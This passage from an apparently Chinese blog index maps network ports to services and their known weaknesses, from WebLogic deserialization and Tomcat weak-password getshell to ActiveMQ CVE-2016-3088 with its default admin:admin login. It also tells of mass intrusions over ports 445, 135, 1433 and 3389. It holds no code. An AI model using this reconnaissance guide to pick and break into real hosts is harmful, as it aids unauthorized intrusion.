class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">无密码或弱密码<br></code></pre></td></tr></table></figure><h5 id="7001-7002">7001/7002</h5><p>Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞</p><h5 id="7180">7180</h5><p>Cloudera manager端口</p><h5 id="8069">8069</h5><p>Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞</p><h5 id="8080">8080</h5><p>Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell</p><h5 id="8080-8090">8080-8090</h5><p>可能存在web服务</p><h5 id="8089">8089</h5><p>Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞</p><h5 id="8161">8161</h5><p>Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）</p><h5 id="9000">9000</h5><p>fastcgi端口，可能存在远程命令执行漏洞</p><h5 id="9001">9001</h5><p>Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)</p><h5 id="9043-9090">9043/9090</h5><p>WebSphere，可能存在WebSphere反序列化漏洞</p><h5 id="9200-9300-Elasticsearch">9200/9300 Elasticsearch</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">代码执行<br></code></pre></td></tr></table></figure><h5 id="10000">10000</h5><p>Webmin-Web控制面板，可能存在弱口令</p><h5 id="10001-10002">10001/10002</h5><p>JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)</p><h5 id="11211-Memcached">11211 Memcached</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">未授权访问<br></code></pre></td></tr></table></figure><h5 id="27017-27018-MongoDB">27017/27018 MongoDB</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">无密码或弱密码<br></code></pre></td></tr></table></figure><h5 id="50070-Hadoop">50070 Hadoop</h5><p>Hadoop服务端口，可能存在 Hadoop未授权访问漏洞</p><h5 id="61616">61616</h5><p>Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现</p><h5 id="60020">60020</h5><p>hbase.regionserver.port，HRegionServer的RPC端口</p><h5 id="60030">60030</h5><p>hbase.regionserver.info.port，HRegionServer的http端口</p><h4 id="端口入侵">端口入侵</h4><h6 id="21端口">21端口</h6><p>在服务器还未流行的时候，大多网站使用的是主机空间，网站文件是通过ftp进行传输，登陆需要账号和密码，因此出现不少ftp批量爆破工具</p><h6 id="135端口">135端口</h6><p>早期黑客入侵个人电脑常使用135端口，先扫描大量135端口开发的ip后，在使用ntscan扫描器批量猜解密码，传ftp木马等。</p><h6 id="445端口">445端口</h6><p>网吧的噩梦，网吧此端口不关，常常被黑客批量入侵全部电脑，网吧看谁不爽关谁的电脑，早期批量入侵网吧电脑、批量入侵机房电脑使用的就是此端口。直接在cmd使用ipc$空连接连接内网主机，真正实现用cmd入侵主机，像极了电影中的黑客。</p><h6 id="1433端口和3306端口">1433端口和3306端口</h6><p>sqlserver默认端口号为：1433,  mysql的默认端口号为3306,这两个端口分别是两种数据库的默认链接端口，很多默认没有密码，或者使用弱密码，也常常被而已扫描利用。某某教程网域名的1433便取与此。</p><h6 id="3380端口">3380端口</h6><p>3389端口是服务器默认连接端口，我们都知道电脑的默认用户名是administrator,但是密码很多人就设置很简单的密码或者空密码，导致被入侵</p>]]></content>
      
      
      
        <tags>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
